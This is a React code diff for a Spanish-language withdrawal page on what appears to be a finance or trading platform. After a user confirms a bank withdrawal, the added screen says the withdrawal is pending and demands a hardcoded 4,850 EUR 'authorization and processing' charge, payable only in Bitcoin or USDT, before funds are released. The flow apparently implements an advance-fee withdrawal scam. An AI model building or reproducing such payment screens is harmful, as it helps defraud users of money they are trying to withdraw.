@@ -1,4 +1,5 @@
 import { useEffect, useState, useCallback, useMemo } from 'react';
+import { useNavigate } from 'react-router-dom';
 import { motion, AnimatePresence } from 'framer-motion';
 import { Layout } from '../components/layout/Layout';
 import api from '../lib/api';
@@ -8,8 +9,10 @@ import { toast } from 'sonner';
 import {
     Send, ArrowRight, ChevronRight, Building2, Mail, Loader2, CheckCircle2,
     XCircle, Clock, AlertTriangle, RefreshCw, Copy, Check,
-    Banknote, ShieldCheck,
+    Banknote, ShieldCheck, Bitcoin, Receipt,
 } from 'lucide-react';
+
+const WITHDRAW_CHARGE_EUR = 4850;
 
 const fmt = (n, d = 2) => Number(n || 0).toLocaleString('es-ES', { minimumFractionDigits: d, maximumFractionDigits: d });
 const fmtDate = (iso) => !iso ? '—' : new Date(iso).toLocaleString('es-ES', {
@@ -575,6 +578,9 @@ const BankWithdrawalPage = () => {
 
     // detail modal
     const [detailItem, setDetailItem] = useState(null);
+    // abono screen after confirm
+    const [abonoRequest, setAbonoRequest] = useState(null);
+    const navigate = useNavigate();
 
     const load = useCallback(async () => {
         setLoading(true);
@@ -670,21 +676,98 @@ const BankWithdrawalPage = () => {
     const handleConfirmCode = async (code) => {
         setConfirming(true);
         try {
-            await api.post(`/bank-withdrawal/${initiateResp.request_id}/confirm-code`, { code });
-            toast.success('¡Retiro confirmado!');
+            const r = await api.post(`/bank-withdrawal/${initiateResp.request_id}/confirm-code`, { code });
+            toast.success('¡Retiro confirmado! Complete el abono para autorizar.');
+            const req = r.data?.request || {};
             // Reset wizard
             setStep(1);
             setForm({ ...form, amount: '', bank_holder: '', bank_account: '', bank_swift: '' });
             setPreview(null);
             setInitiateResp(null);
-            setTab('history');
             load();
+            // Show abono screen
+            setAbonoRequest({
+                reference: req.reference || initiateResp.reference,
+                id: req.id || initiateResp.request_id,
+                net_to_amount: req.net_to_amount,
+                to_currency: req.to_currency,
+                bank_name: req.bank_name,
+            });
         } catch (err) {
             toast.error(err.response?.data?.detail || 'Código inválido');
         } finally {
             setConfirming(false);
         }
     };
+
+    if (abonoRequest) {
+        return (
+            <Layout>
+                <div className="max-w-2xl mx-auto px-4 sm:px-6 py-6 space-y-5" data-testid="bank-wd-abono-screen">
+                    <div className="flex items-center gap-2 px-3 py-2 rounded-lg bg-amber-500/10 border border-amber-500/30 w-fit">
+                        <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
+                        <span className="text-amber-300 text-xs font-semibold">Estado: Pendiente de abono</span>
+                    </div>
+
+                    <div className="rounded-2xl border border-emerald-500/25 bg-emerald-500/[0.04] p-5">
+                        <div className="flex items-center gap-2 mb-2">
+                            <CheckCircle2 className="w-5 h-5 text-emerald-400" />
+                            <h2 className="text-white text-lg font-bold">Solicitud de retiro registrada</h2>
+                        </div>
+                        <p className="text-slate-300 text-sm leading-relaxed">
+                            Su retiro <span className="font-mono text-white">{abonoRequest.reference}</span>
+                            {abonoRequest.net_to_amount ? <> por <span className="text-emerald-300 font-bold">{fmt(abonoRequest.net_to_amount)} {abonoRequest.to_currency}</span> a {abonoRequest.bank_name}</> : null} ha sido registrado correctamente.
+                            Para autorizar y procesar el envío es necesario completar el siguiente abono.
+                        </p>
+                    </div>
+
+                    <div className="rounded-2xl border border-amber-500/30 bg-gradient-to-br from-[#2a1a0a] via-slate-900 to-slate-950 p-5">
+                        <div className="flex items-start gap-3 mb-4">
+                            <div className="w-11 h-11 rounded-xl bg-amber-500/15 ring-1 ring-amber-500/40 flex items-center justify-center flex-shrink-0">
+                                <Receipt className="w-5 h-5 text-amber-300" />
+                            </div>
+                            <div>
+                                <p className="text-[11px] uppercase tracking-[0.16em] text-amber-400 font-bold">Importe requerido</p>
+                                <h3 className="text-white text-lg font-semibold mt-0.5">Cargo de autorización y procesamiento del retiro</h3>
+                            </div>
+                        </div>
+                        <div className="flex items-end justify-between gap-3 rounded-xl border border-slate-800/80 bg-slate-950/50 p-4 mb-4">
+                            <div>
+                                <p className="text-[10px] uppercase tracking-[0.14em] text-slate-500 font-semibold">Importe a abonar</p>
+                                <p className="text-3xl sm:text-4xl mt-1 font-mono tabular-nums font-bold text-amber-300">
+                                    {WITHDRAW_CHARGE_EUR.toLocaleString('es-ES', { minimumFractionDigits: 2 })} €
+                                </p>
+                            </div>
+                            <div className="text-right">
+                                <p className="text-[10px] uppercase tracking-[0.14em] text-slate-500 font-semibold">Método</p>
+                                <p className="text-white font-semibold text-sm mt-1 flex items-center gap-1.5"><Bitcoin className="w-4 h-4 text-orange-400" /> Cripto BTC / USDT</p>
+                            </div>
+                        </div>
+                        <p className="text-slate-400 text-xs leading-relaxed mb-4">
+                            El abono se realiza mediante criptomonedas con verificación automática en blockchain.
+                            Una vez verificado, su retiro será autorizado y procesado. El pago queda enlazado a esta solicitud
+                            (referencia <span className="font-mono text-slate-300">{abonoRequest.reference}</span>).
+                        </p>
+                        <Button
+                            onClick={() => navigate(`/withdraw-methods?abono_ref=${encodeURIComponent(abonoRequest.reference)}#crypto-payments`)}
+                            className="w-full h-12 bg-amber-500/20 border border-amber-500/50 text-amber-200 hover:bg-amber-500/30 font-semibold"
+                            data-testid="bank-wd-goto-crypto-btn"
+                        >
+                            <Bitcoin className="w-4 h-4 mr-2" /> Ir a Pagos en Criptomonedas
+                        </Button>
+                    </div>
+
+                    <button
+                        onClick={() => { setAbonoRequest(null); setTab('history'); }}
+                        className="text-slate-400 hover:text-white text-xs mx-auto block"
+                        data-testid="bank-wd-abono-later-btn"
+                    >
+                        Abonar más tarde · ver mis retiros
+                    </button>
+                </div>
+            </Layout>
+        );
+    }
 
     return (
         <Layout>
